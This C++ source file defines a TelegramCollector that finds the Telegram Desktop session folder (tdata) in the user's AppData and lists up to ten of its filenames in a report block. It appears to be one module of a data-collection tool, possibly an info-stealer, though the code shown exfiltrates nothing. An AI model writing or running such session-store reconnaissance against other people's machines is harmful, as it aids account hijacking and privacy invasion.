#include "telegram_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>

std::string TelegramCollector::CollectTelegramData() {
    std::ostringstream result;
    result << "\n=== TELEGRAM DATA ===\n";
    
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    
    std::string telegramPath = std::string(appdata) + "\\Telegram Desktop\\tdata";
    
    if (std::filesystem::exists(telegramPath)) {
        result << "Telegram tdata: FOUND\n";
        
        try {
            int fileCount = 0;
            for (auto& p : std::filesystem::directory_iterator(telegramPath)) {
                if (p.is_regular_file() && fileCount < 10) {
                    result << "  File: " << p.path().filename().string() << "\n";
                    fileCount++;
                }
            }
            result << "Total tdata files: " << fileCount << "\n";
        } catch (...) {
            result << "  Access denied\n";
        }
    } else {
        result << "Telegram not found\n";
    }
    
    return result.str();
}
